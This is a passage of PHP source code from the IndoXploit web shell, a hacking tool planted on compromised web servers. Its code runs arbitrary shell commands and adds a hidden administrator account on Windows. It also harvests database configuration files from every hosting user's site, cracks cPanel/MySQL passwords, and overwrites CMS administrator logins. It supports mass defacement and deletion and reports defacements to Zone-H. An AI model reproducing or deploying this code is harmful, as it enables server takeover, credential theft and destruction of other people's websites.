			print color(1, 1, "Unknown '".$args[0]."'");
		}
	}
	elseif($toolsname === "krdp") {
		$args = explode(" ", $args);

		if(OS() !== "Windows") die(color(1, 1, "Just For Windows Server"));
		if(preg_match("/indoxploit/", exe("net user"))) die(color(1, 1, "[INFO] username 'indoxploit' already exists."));

		$add_user   = exe("net user indoxploit indoxploit /add");
    	$add_groups1 = exe("net localgroup Administrators indoxploit /add");
    	$add_groups2 = exe("net localgroup Administrator indoxploit /add");
    	$add_groups3 = exe("net localgroup Administrateur indoxploit /add");

    	print "[ RDP ACCOUNT INFO ]<br>
    	------------------------------<br>
    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
    	Username: ".color(1, 2, "indoxploit")."<br>
    	Password: ".color(1, 2, "indoxploit")."<br>
    	------------------------------<br><br>
    	[ STATUS ]<br>
    	------------------------------<br>
    	";

    	if($add_user) {
    		print "[add user] -> ".color(1, 2, "SUCCESS")."<br>";
    	} 
    	else {
    		print "[add user] -> ".color(1, 1, "FAILED")."<br>";
    	}
    	
    	if($add_groups1) {
        	print "[add localgroup Administrators] -> ".color(1, 2, "SUCCESS")."<br>";
    	} 
    	elseif($add_groups2) {
            print "[add localgroup Administrator] -> ".color(1, 2, "SUCCESS")."<br>";
    	} 
    	elseif($add_groups3) { 
            print "[add localgroup Administrateur] -> ".color(1, 2, "SUCCESS")."<br>";
    	} 
    	else {
    		print "[add localgroup] -> ".color(1, 1, "FAILED")."<br>";
    	}

    	print "------------------------------<br>";
	}
}

function files_and_folder() {
	if(!is_dir(path())) die(color(1, 1, "Directory '".path()."' is not exists."));
	if(!is_readable(path())) die(color(1, 1, "Directory '".path()."' not readable."));
	print '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
		   <tr>
		   <th class="th_home"><center>Name</center></th>
		   <th class="th_home"><center>Type</center></th>
		   <th class="th_home"><center>Size</center></th>
		   <th class="th_home"><center>Last Modified</center></th>
		   <th class="th_home"><center>Owner/Group</center></th>
		   <th class="th_home"><center>Permission</center></th>
		   <th class="th_home"><center>Action</center></th>
		   </tr>';

	if(function_exists('opendir')) {
		if($opendir = opendir(path())) {
			while(($readdir = readdir($opendir)) !== false) {
				$dir[] = $readdir;
			}
			closedir($opendir);
		}
		sort($dir);
	} else {
		$dir = scandir(path());
	}

	foreach($dir as $folder) {
		$dirinfo['path'] = path().DIRECTORY_SEPARATOR.$folder;
		if(!is_dir($dirinfo['path'])) continue;
		$dirinfo['type']  = filetype($dirinfo['path']);
		$dirinfo['time']  = date("F d Y g:i:s", filemtime($dirinfo['path']));
		$dirinfo['size']  = "-";
		$dirinfo['perms'] = writeable($dirinfo['path'], perms($dirinfo['path']));
		$dirinfo['link']  = ($folder === ".." ? "<a href='?dir=".dirname(path())."'>$folder</a>" : ($folder === "." ?  "<a href='?dir=".path()."'>$folder</a>" : "<a href='?dir=".$dirinfo['path']."'>$folder</a>"));
		$dirinfo['action']= ($folder === '.' || $folder === '..') ? "<a href='?act=newfile&dir=".path()."'>newfile</a> | <a href='?act=newfolder&dir=".path()."'>newfolder</a>" : "<a href='?act=rename_folder&dir=".$dirinfo['path']."'>rename</a> | <a href='?act=delete_folder&dir=".$dirinfo['path']."'>delete</a>";
		if(function_exists('posix_getpwuid')) {
			$dirinfo['owner'] = (object) @posix_getpwuid(fileowner($dirinfo['path']));
			$dirinfo['owner'] = $dirinfo['owner']->name;
		} else {
			$dirinfo['owner'] = fileowner($dirinfo['path']);
		}
		if(function_exists('posix_getgrgid')) {
			$dirinfo['group'] = (object) @posix_getgrgid(filegroup($dirinfo['path']));
			$dirinfo['group'] = $dirinfo['group']->name;
		} else {
			$dirinfo['group'] = filegroup($dirinfo['path']);
		}
		print "<tr>";
		print "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>".$dirinfo['link']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$dirinfo['type']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$dirinfo['size']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$dirinfo['time']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$dirinfo['owner'].DIRECTORY_SEPARATOR.$dirinfo['group']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$dirinfo['perms']."</td>";
		print "<td class='td_home' style='padding-left: 15px;'>".$dirinfo['action']."</td>";
		print "</tr>";
	}
	foreach($dir as $files) {
		$fileinfo['path'] = path().DIRECTORY_SEPARATOR.$files;
		if(!is_file($fileinfo['path'])) continue;
		$fileinfo['type'] = filetype($fileinfo['path']);
		$fileinfo['time'] = date("F d Y g:i:s", filemtime($fileinfo['path']));
		$fileinfo['size'] = filesize($fileinfo['path'])/1024;
		$fileinfo['size'] = round($fileinfo['size'],3);
		$fileinfo['size'] = ($fileinfo['size'] > 1024) ? round($fileinfo['size']/1024,2). "MB" : $fileinfo['size']. "KB";
		$fileinfo['perms']= writeable($fileinfo['path'], perms($fileinfo['path']));
		if(function_exists('posix_getpwuid')) {
			$fileinfo['owner'] =  (object) @posix_getpwuid(fileowner($fileinfo['path']));
			$fileinfo['owner'] = $fileinfo['owner']->name;
		} else {
			$fileinfo['owner'] = fileowner($fileinfo['path']);
		}
		if(function_exists('posix_getgrgid')) {
			$fileinfo['group'] = (object) @posix_getgrgid(filegroup($fileinfo['path']));
			$fileinfo['group'] = $fileinfo['group']->name;
		} else {
			$fileinfo['group'] = filegroup($fileinfo['path']);
		}
		print "<tr>";
		print "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=".path()."&file=".$fileinfo['path']."'>$files</a></td>";
		print "<td class='td_home' style='text-align: center;'>".$fileinfo['type']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$fileinfo['size']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$fileinfo['time']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$fileinfo['owner'].DIRECTORY_SEPARATOR.$fileinfo['group']."</td>";
		print "<td class='td_home' style='text-align: center;'>".$fileinfo['perms']."</td>";
		print "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=".path()."&file=".$fileinfo['path']."'>edit</a> | <a href='?act=rename&dir=".path()."&file=".$fileinfo['path']."'>rename</a> | <a href='?act=delete&dir=".path()."&file=".$fileinfo['path']."'>delete</a> | <a href='?act=download&dir=".path()."&file=".$fileinfo['path']."'>download</a></td>";
		print "</tr>";
	}

	print "</table>";
	print "<center>Copyright &copy; ".date("Y")." - <a href='http://indoxploit.or.id/' target='_blank'>".color(1, 2, "IndoXploit")."</a></center>";
}


function action() {
	tools("upload");
	tools("cmd");
	print "<hr style='margin-top: 15px; margin-bottom: 10px;'>";
	print "<center>";
	print "<ul>";
	print "<li>[ <a href='?'>Home</a> ]</li>";
	print "<li>[ <a href='?dir=".path()."&do=jumping'>Jumping</a> ]</li>";
	print "<li>[ <a href='?dir=".path()."&do=config'>Config</a> ]</li>";
	print "<li>[ <a href='?dir=".path()."&do=fakeroot'>Fake Root</a> ]</li>";
	print "<li>[ <a href='?dir=".path()."&do=cpanel'>cPanel Crack</a> ]</li>";
	print "<li>[ <a href='?dir=".path()."&do=mpc'>Mass Password Change</a> ]</li>";
	print "<li>[ <a href='?dir=".path()."&do=mass'>Mass Deface/Delete</a> ]</li>";
	print "<li>[ <a href='?dir=".path()."&do=zoneh'>Zone-H</a> ]</li>";
	print "</ul>";
	print "</center>";
	print "<hr style='margin-top: 15px; margin-bottom: 10px;'>";


	if(isset($_GET['do'])) {
		if($_GET['do'] === "cmd") {
			if(isset($_POST['cmd'])) {
				if(preg_match("/^rf (.*)$/", $_POST['cmd'], $match)) {
					tools("readfile", $match[1]);
				}
				elseif(preg_match("/^spawn (.*)$/", $_POST['cmd'], $match)) {
					tools("spawn", $match[1]);
				}
				elseif(preg_match("/^symlink\s?(.*)$/", $_POST['cmd'], $match)) {
					tools("symlink", $match[1]);
				}
				elseif(preg_match("/^rvr (.*)$/", $_POST['cmd'], $match)) {
					tools("network", $match[1]);
				}
				elseif(preg_match("/^krdp$/", $_POST['cmd'])) {
					tools("krdp");
				}
				elseif(preg_match("/^logout$/", $_POST['cmd'])) {
					unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
					print "<script>window.location='?';</script>";
				}
				elseif(preg_match("/^killme$/", $_POST['cmd'])) {
					unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
					@unlink(__FILE__);
					print "<script>window.location='?';</script>";
				}
				else {
					print "<pre>".exe($_POST['cmd'])."</pre>";
				}
			}
			else {
				files_and_folder();
			}
		}
		elseif($_GET['do'] === "jumping") {
			$i = 0;
			foreach(getuser() as $user) {
				$path = "/home/$user/public_html";
				if(is_readable($path)) {
					$status = color(1, 2, "[R]");
					if(is_writable($path)) {
						$status = color(1, 2, "[RW]");
					}
					$i++;
					print "$status <a href='?dir=$path'>".color(1, 4, $path)."</a>";
					if(!function_exists('posix_getpwuid')) print "<br>";
					if(!getdomainname()) print " => ".color(1, 1, "Can't get domain name")."<br>";
					foreach(getdomainname() as $domain) {
						$userdomain = (object) @posix_getpwuid(@fileowner("/etc/valiases/$domain"));
						$userdomain = $userdomain->name;
						if($userdomain === $user) {
							print " => <a href='http://$domain/' target='_blank'>".color(1, 2, $domain)."</a><br>";
							break;
						}
					}
				}
			}
			print ($i === 0) ? "" : "<p>".color(1, 3, "Total ada $i kamar di ".$GLOBALS['SERVERIP'])."</p>";
		}
		elseif($_GET['do'] === "config") {
			if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_config'."));
			if(!is_dir(path()."/idx_config/")) {
				@mkdir('idx_config', 0755);
				$htaccess = "Options all\nDirectoryIndex indoxploit.htm\nSatisfy Any";
				save("idx_config/.htaccess","w", $htaccess);

				foreach(getuser() as $user) {
					$user_docroot = "/home/$user/public_html/";
					if(is_readable($user_docroot)) {
						$getconfig = array(
							"/home/$user/.accesshash" => "WHM-accesshash",
							"$user_docroot/config/koneksi.php" => "Lokomedia",
							"$user_docroot/forum/config.php" => "phpBB",
							"$user_docroot/sites/default/settings.php" => "Drupal",
							"$user_docroot/config/settings.inc.php" => "PrestaShop",
							"$user_docroot/app/etc/local.xml" => "Magento",
							"$user_docroot/admin/config.php" => "OpenCart",
							"$user_docroot/application/config/database.php" => "Ellislab",
							"$user_docroot/vb/includes/config.php" => "Vbulletin",
							"$user_docroot/includes/config.php" => "Vbulletin",
							"$user_docroot/forum/includes/config.php" => "Vbulletin",
							"$user_docroot/forums/includes/config.php" => "Vbulletin",
							"$user_docroot/cc/includes/config.php" => "Vbulletin",
							"$user_docroot/inc/config.php" => "MyBB",
							"$user_docroot/includes/configure.php" => "OsCommerce",
							"$user_docroot/shop/includes/configure.php" => "OsCommerce",
							"$user_docroot/os/includes/configure.php" => "OsCommerce",
							"$user_docroot/oscom/includes/configure.php" => "OsCommerce",
							"$user_docroot/products/includes/configure.php" => "OsCommerce",
							"$user_docroot/cart/includes/configure.php" => "OsCommerce",
							"$user_docroot/inc/conf_global.php" => "IPB",
							"$user_docroot/wp-config.php" => "Wordpress",
							"$user_docroot/wp/test/wp-config.php" => "Wordpress",
							"$user_docroot/blog/wp-config.php" => "Wordpress",
							"$user_docroot/beta/wp-config.php" => "Wordpress",
							"$user_docroot/portal/wp-config.php" => "Wordpress",
							"$user_docroot/site/wp-config.php" => "Wordpress",
							"$user_docroot/wp/wp-config.php" => "Wordpress",
							"$user_docroot/WP/wp-config.php" => "Wordpress",
							"$user_docroot/news/wp-config.php" => "Wordpress",
							"$user_docroot/wordpress/wp-config.php" => "Wordpress",
							"$user_docroot/test/wp-config.php" => "Wordpress",
							"$user_docroot/demo/wp-config.php" => "Wordpress",
							"$user_docroot/home/wp-config.php" => "Wordpress",
							"$user_docroot/v1/wp-config.php" => "Wordpress",
							"$user_docroot/v2/wp-config.php" => "Wordpress",
							"$user_docroot/press/wp-config.php" => "Wordpress",
							"$user_docroot/new/wp-config.php" => "Wordpress",
							"$user_docroot/blogs/wp-config.php" => "Wordpress",
							"$user_docroot/configuration.php" => "Joomla",
							"$user_docroot/blog/configuration.php" => "Joomla",
							"$user_docroot/submitticket.php" => "^WHMCS",
							"$user_docroot/cms/configuration.php" => "Joomla",
							"$user_docroot/beta/configuration.php" => "Joomla",
							"$user_docroot/portal/configuration.php" => "Joomla",
							"$user_docroot/site/configuration.php" => "Joomla",
							"$user_docroot/main/configuration.php" => "Joomla",
							"$user_docroot/home/configuration.php" => "Joomla",
							"$user_docroot/demo/configuration.php" => "Joomla",
							"$user_docroot/test/configuration.php" => "Joomla",
							"$user_docroot/v1/configuration.php" => "Joomla",
							"$user_docroot/v2/configuration.php" => "Joomla",
							"$user_docroot/joomla/configuration.php" => "Joomla",
							"$user_docroot/new/configuration.php" => "Joomla",
							"$user_docroot/WHMCS/submitticket.php" => "WHMCS",
							"$user_docroot/whmcs1/submitticket.php" => "WHMCS",
							"$user_docroot/Whmcs/submitticket.php" => "WHMCS",
							"$user_docroot/whmcs/submitticket.php" => "WHMCS",
							"$user_docroot/whmcs/submitticket.php" => "WHMCS",
							"$user_docroot/WHMC/submitticket.php" => "WHMCS",
							"$user_docroot/Whmc/submitticket.php" => "WHMCS",
							"$user_docroot/whmc/submitticket.php" => "WHMCS",
							"$user_docroot/WHM/submitticket.php" => "WHMCS",
							"$user_docroot/Whm/submitticket.php" => "WHMCS",
							"$user_docroot/whm/submitticket.php" => "WHMCS",
							"$user_docroot/HOST/submitticket.php" => "WHMCS",
							"$user_docroot/Host/submitticket.php" => "WHMCS",
							"$user_docroot/host/submitticket.php" => "WHMCS",
							"$user_docroot/SUPPORTES/submitticket.php" => "WHMCS",
							"$user_docroot/Supportes/submitticket.php" => "WHMCS",
							"$user_docroot/supportes/submitticket.php" => "WHMCS",
							"$user_docroot/domains/submitticket.php" => "WHMCS",
							"$user_docroot/domain/submitticket.php" => "WHMCS",
							"$user_docroot/Hosting/submitticket.php" => "WHMCS",
							"$user_docroot/HOSTING/submitticket.php" => "WHMCS",
							"$user_docroot/hosting/submitticket.php" => "WHMCS",
							"$user_docroot/CART/submitticket.php" => "WHMCS",
							"$user_docroot/Cart/submitticket.php" => "WHMCS",
							"$user_docroot/cart/submitticket.php" => "WHMCS",
							"$user_docroot/ORDER/submitticket.php" => "WHMCS",
							"$user_docroot/Order/submitticket.php" => "WHMCS",
							"$user_docroot/order/submitticket.php" => "WHMCS",
							"$user_docroot/CLIENT/submitticket.php" => "WHMCS",
							"$user_docroot/Client/submitticket.php" => "WHMCS",
							"$user_docroot/client/submitticket.php" => "WHMCS",
							"$user_docroot/CLIENTAREA/submitticket.php" => "WHMCS",
							"$user_docroot/Clientarea/submitticket.php" => "WHMCS",
							"$user_docroot/clientarea/submitticket.php" => "WHMCS",
							"$user_docroot/SUPPORT/submitticket.php" => "WHMCS",
							"$user_docroot/Support/submitticket.php" => "WHMCS",
							"$user_docroot/support/submitticket.php" => "WHMCS",
							"$user_docroot/BILLING/submitticket.php" => "WHMCS",
							"$user_docroot/Billing/submitticket.php" => "WHMCS",
							"$user_docroot/billing/submitticket.php" => "WHMCS",
							"$user_docroot/BUY/submitticket.php" => "WHMCS",
							"$user_docroot/Buy/submitticket.php" => "WHMCS",
							"$user_docroot/buy/submitticket.php" => "WHMCS",
							"$user_docroot/MANAGE/submitticket.php" => "WHMCS",
							"$user_docroot/Manage/submitticket.php" => "WHMCS",
							"$user_docroot/manage/submitticket.php" => "WHMCS",
							"$user_docroot/CLIENTSUPPORT/submitticket.php" => "WHMCS",
							"$user_docroot/ClientSupport/submitticket.php" => "WHMCS",
							"$user_docroot/Clientsupport/submitticket.php" => "WHMCS",
							"$user_docroot/clientsupport/submitticket.php" => "WHMCS",
							"$user_docroot/CHECKOUT/submitticket.php" => "WHMCS",
							"$user_docroot/Checkout/submitticket.php" => "WHMCS",
							"$user_docroot/checkout/submitticket.php" => "WHMCS",
							"$user_docroot/BILLINGS/submitticket.php" => "WHMCS",
							"$user_docroot/Billings/submitticket.php" => "WHMCS",
							"$user_docroot/billings/submitticket.php" => "WHMCS",
							"$user_docroot/BASKET/submitticket.php" => "WHMCS",
							"$user_docroot/Basket/submitticket.php" => "WHMCS",
							"$user_docroot/basket/submitticket.php" => "WHMCS",
							"$user_docroot/SECURE/submitticket.php" => "WHMCS",
							"$user_docroot/Secure/submitticket.php" => "WHMCS",
							"$user_docroot/secure/submitticket.php" => "WHMCS",
							"$user_docroot/SALES/submitticket.php" => "WHMCS",
							"$user_docroot/Sales/submitticket.php" => "WHMCS",
							"$user_docroot/sales/submitticket.php" => "WHMCS",
							"$user_docroot/BILL/submitticket.php" => "WHMCS",
							"$user_docroot/Bill/submitticket.php" => "WHMCS",
							"$user_docroot/bill/submitticket.php" => "WHMCS",
							"$user_docroot/PURCHASE/submitticket.php" => "WHMCS",
							"$user_docroot/Purchase/submitticket.php" => "WHMCS",
							"$user_docroot/purchase/submitticket.php" => "WHMCS",
							"$user_docroot/ACCOUNT/submitticket.php" => "WHMCS",
							"$user_docroot/Account/submitticket.php" => "WHMCS",
							"$user_docroot/account/submitticket.php" => "WHMCS",
							"$user_docroot/USER/submitticket.php" => "WHMCS",
							"$user_docroot/User/submitticket.php" => "WHMCS",
							"$user_docroot/user/submitticket.php" => "WHMCS",
							"$user_docroot/CLIENTS/submitticket.php" => "WHMCS",
							"$user_docroot/Clients/submitticket.php" => "WHMCS",
							"$user_docroot/clients/submitticket.php" => "WHMCS",
							"$user_docroot/BILLINGS/submitticket.php" => "WHMCS",
							"$user_docroot/Billings/submitticket.php" => "WHMCS",
							"$user_docroot/billings/submitticket.php" => "WHMCS",
							"$user_docroot/MY/submitticket.php" => "WHMCS",
							"$user_docroot/My/submitticket.php" => "WHMCS",
							"$user_docroot/my/submitticket.php" => "WHMCS",
							"$user_docroot/secure/whm/submitticket.php" => "WHMCS",
							"$user_docroot/secure/whmcs/submitticket.php" => "WHMCS",
							"$user_docroot/panel/submitticket.php" => "WHMCS",
							"$user_docroot/clientes/submitticket.php" => "WHMCS",
							"$user_docroot/cliente/submitticket.php" => "WHMCS",
							"$user_docroot/support/order/submitticket.php" => "WHMCS",
							"$user_docroot/bb-config.php" => "BoxBilling",
							"$user_docroot/boxbilling/bb-config.php" => "BoxBilling",
							"$user_docroot/box/bb-config.php" => "BoxBilling",
							"$user_docroot/host/bb-config.php" => "BoxBilling",
							"$user_docroot/Host/bb-config.php" => "BoxBilling",
							"$user_docroot/supportes/bb-config.php" => "BoxBilling",
							"$user_docroot/support/bb-config.php" => "BoxBilling",
							"$user_docroot/hosting/bb-config.php" => "BoxBilling",
							"$user_docroot/cart/bb-config.php" => "BoxBilling",
							"$user_docroot/order/bb-config.php" => "BoxBilling",
							"$user_docroot/client/bb-config.php" => "BoxBilling",
							"$user_docroot/clients/bb-config.php" => "BoxBilling",
							"$user_docroot/cliente/bb-config.php" => "BoxBilling",
							"$user_docroot/clientes/bb-config.php" => "BoxBilling",
							"$user_docroot/billing/bb-config.php" => "BoxBilling",
							"$user_docroot/billings/bb-config.php" => "BoxBilling",
							"$user_docroot/my/bb-config.php" => "BoxBilling",
							"$user_docroot/secure/bb-config.php" => "BoxBilling",
							"$user_docroot/support/order/bb-config.php" => "BoxBilling",
							"$user_docroot/includes/dist-configure.php" => "Zencart",
							"$user_docroot/zencart/includes/dist-configure.php" => "Zencart",
							"$user_docroot/products/includes/dist-configure.php" => "Zencart",
							"$user_docroot/cart/includes/dist-configure.php" => "Zencart",
							"$user_docroot/shop/includes/dist-configure.php" => "Zencart",
							"$user_docroot/includes/iso4217.php" => "Hostbills",
							"$user_docroot/hostbills/includes/iso4217.php" => "Hostbills",
							"$user_docroot/host/includes/iso4217.php" => "Hostbills",
							"$user_docroot/Host/includes/iso4217.php" => "Hostbills",
							"$user_docroot/supportes/includes/iso4217.php" => "Hostbills",
							"$user_docroot/support/includes/iso4217.php" => "Hostbills",
							"$user_docroot/hosting/includes/iso4217.php" => "Hostbills",
							"$user_docroot/cart/includes/iso4217.php" => "Hostbills",
							"$user_docroot/order/includes/iso4217.php" => "Hostbills",
							"$user_docroot/client/includes/iso4217.php" => "Hostbills",
							"$user_docroot/clients/includes/iso4217.php" => "Hostbills",
							"$user_docroot/cliente/includes/iso4217.php" => "Hostbills",
							"$user_docroot/clientes/includes/iso4217.php" => "Hostbills",
							"$user_docroot/billing/includes/iso4217.php" => "Hostbills",
							"$user_docroot/billings/includes/iso4217.php" => "Hostbills",
							"$user_docroot/my/includes/iso4217.php" => "Hostbills",
							"$user_docroot/secure/includes/iso4217.php" => "Hostbills",
							"$user_docroot/support/order/includes/iso4217.php" => "Hostbills"

						);
						foreach($getconfig as $config => $userconfig) {
							$get = file_get_contents($config);
							if($get == '') {
							}
							else {
								$fopen = fopen("idx_config/$user-$userconfig.txt", "w");
								fputs($fopen, $get);
							}
						}
					}
				}
			}
			print "<div style='background: #ffffff; width: 100%; height: 100%'>";
			print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_config/' frameborder='0' scrolling='yes'></iframe>";
			print "</div>";
		}
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				$nick 	= $_POST['nick'];
				$domain = explode("\r\n", $_POST['url']);

				print "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
				print "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
	
				foreach($domain as $no => $url) {
					$no   = ($no+1).".";
					$post = curl("http://www.zone-h.org/notify/single", TRUE, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send")['response'];
					if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $post)) {
						print "$no $url -> ".color(1, 2, "OK")."<br>";
					} else {
						print "$no $url -> ".color(1, 1, "ERROR")."<br>";
					}
				}
			}
			else {
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='IndoXploit'><br><br>
		    	       Domains: <br>
		    	       <textarea style='width: 450px; height: 150px;' name='url' placeholder='http://google.com/'></textarea><br>
		    	       <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px;' type='submit' name='submit' value='Submit'>
		    	       </form></center>";
		   	}
		}
		elseif($_GET['do'] == 'cpanel') {
			if($_POST['crack']) {
				$usercp = explode("\r\n", $_POST['user_cp']);
				$passcp = explode("\r\n", $_POST['pass_cp']);
				$i = 0;
				foreach($usercp as $ucp) {
					foreach($passcp as $pcp) {
						$connect = mysql_connect('localhost', $ucp, $pcp);
						if($connect) {
							if($_SESSION[$ucp] && $_SESSION[$pcp]) {
							} else {
								$_SESSION[$ucp] = "1";
								$_SESSION[$pcp] = "1";
								if($ucp === '' || $pcp === '') {
									// 
								} else {
									$i++;
									print "username (".color(1, 2, $ucp).") password (".color(1, 2, $pcp).") domain (";
									if(!function_exists('posix_getpwuid')) print color(1, 1, "Function is Disable by System!");
									if(!getdomainname()) print color(1, 1, "Can't get domain name");
									foreach(getdomainname() as $domain) {
										$userdomain = (object) @posix_getpwuid(@fileowner("/etc/valiases/$domain"));
										$userdomain = $userdomain->name;
										if($userdomain === $user) {
											print "<a href='http://$domain/' target='_blank'>".color(1, 2, $domain)."</a><br>";
											break;
										}
									}
									print (empty($domain)) ? color(1, 1, "Can't get domain name.") : color(1, 2, $domain);
									print ")<br>";
								}
							}
							mysql_close($connect);
						}
					}
				}
				print ($i === 0) ? "" : "<p>".color(1, 3, "Sukses nyolong $i Cpanel by IndoXploit")."</p>";
			} else {
				print "<center>
					   <span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
					   <form method='post'>
					   USER: <br>
					   <textarea style='width: 450px; height: 150px;' name='user_cp'>";
				print implode("\n", getuser());
				print "</textarea><br>
					   PASS: <br>
					   <input style='background: transparent; border: 1px solid #ffffff; color: #ffffff;' type='text' name='linkpass' placeholder='Grab Password from Link Config'>
					   <input style='background: transparent; border: 1px solid #ffffff; color: #ffffff;' type='submit' name='submitlink' value='>>'>
					   <br>
					   <textarea style='width: 450px; height: 200px;' name='pass_cp'>";

				if(isset($_POST['submitlink'])) {
					$getpass = $_POST['linkpass'];
					$get = curl($_POST['linkpass'])['response'];
					preg_match_all('/<a href="(.*?).txt">/', $get, $link);
					foreach($link[1] as $link_config) {
						$scandir[] = "$link_config.txt";
					}
				}
				else {
					$getpass = path();
					$scandir = scandir($getpass);
				}

				$password = "";

				foreach($scandir as $files) {
					$file = "$getpass/$files";
					$config = file_get_contents($file);
					if(preg_match("/WordPress/", $config)) {
						$password .= getValue($config, "DB_PASSWORD', '", "'")."\n";
					} 
					elseif(preg_match("/JConfig|joomla/", $config)) {
						$password .= getValue($config, "password = '", "'")."\n";
					} 
					elseif(preg_match("/Magento|Mage_Core/", $config)) {
						$password .= getValue($config, "<password><![CDATA[", "]]></password>")."\n";
					} 
					elseif(preg_match("/panggil fungsi validasi xss dan injection/", $config)) {
						$password .= getValue($config, 'password = "', '"')."\n";
					} 
					elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $config)) {
						$password .= getValue($config, "'DB_PASSWORD', '", "'")."\n";
					} 
					elseif(preg_match("/^[client]$/", $config)) {
						preg_match("/password=(.*?)/", $config, $pass);
						if(preg_match('/"/', $pass[1])) {
							$pass[1] = str_replace('"', "", $pass[1]);
							$password .= $pass[1]."\n";
						} 
						else {
							$password .= $pass[1]."\n";
						}
					} 
					elseif(preg_match("/cc_encryption_hash/", $config)) {
						$password .= getValue($config, "db_password = '", "'")."\n";
					}
				}

				print $password;

				print "</textarea><br>
					   <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px;' type='submit' name='crack' value='Crack'>
					   </form></center>";
			}
		}
		elseif($_GET['do'] == 'mpc') {
			if($_POST['hajar']) {
				if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
					print "username atau password harus lebih dari 6 karakter";
				} 
				else {
					$user_baru = $_POST['user_baru'];
					$pass_baru = md5($_POST['pass_baru']);
					$conf = $_POST['config_dir'];

					if(preg_match("/^http:\/\//", $conf) OR preg_match("/^https:\/\//", $conf)) {
						$get = curl($conf)['response'];
						preg_match_all('/<a href="(.*?).txt">/', $get, $link);
						foreach($link[1] as $link_config) {
							$scan_conf[] = "$link_config.txt";
						}
					}
					else {
						$scan_conf = scandir($conf);
					}

					foreach($scan_conf as $file_conf) {
						$config = file_get_contents("$conf/$file_conf");
						if(preg_match("/JConfig|joomla/",$config)) {
							$dbhost = getValue($config,"host = '","'");
							$dbuser = getValue($config,"user = '","'");
							$dbpass = getValue($config,"password = '","'");
							$dbname = getValue($config,"db = '","'");
							$dbprefix = getValue($config,"dbprefix = '","'");
							$prefix = $dbprefix."users";
							$conn = mysql_connect($dbhost,$dbuser,$dbpass);
							$db = mysql_select_db($dbname);
							$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
							$result = mysql_fetch_array($q);
							$id = $result['id'];
							$site = getValue($config,"sitename = '","'");
							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
							print "Config => ".$file_conf."<br>";
							print "CMS => Joomla<br>";
							if($site == '') {
								print "Sitename => ".color(1, 1, "Can't get domain name")."<br>";
							} 
